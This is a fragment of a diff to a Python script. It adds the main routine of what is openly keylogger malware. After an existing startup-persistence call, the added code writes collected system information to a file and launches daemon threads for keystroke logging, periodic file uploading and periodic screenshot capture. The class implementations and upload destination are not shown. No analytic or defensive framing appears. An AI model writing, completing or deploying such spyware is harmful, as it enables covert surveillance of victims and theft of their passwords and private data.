@@ -212,3 +212,30 @@ if __name__ == '__main__':
         add_to_startup()
 
         # Collect system information
+        system_info = collect_system_info()
+        with open(FILENAME, 'a+') as fh:
+            fh.write(system_info)
+
+        # Create objects
+        keylogger = Keylogger()
+        uploader = Uploader()
+        screenshot_capture = ScreenshotCapture()
+
+        # Implement threading
+        keylogger_thread = threading.Thread(target=keylogger.keylogging, daemon=True)
+        uploader_thread = threading.Thread(target=uploader.upload_file_periodically, daemon=True)
+        screenshot_thread = threading.Thread(target=screenshot_capture.capture_periodically, daemon=True)
+
+
+        # Start threads
+        keylogger_thread.start()
+        uploader_thread.start()
+        screenshot_thread.start()
+
+        # Join threads
+        keylogger_thread.join()
+        uploader_thread.join()
+        screenshot_thread.join()
+
+    except KeyboardInterrupt:
+        pass
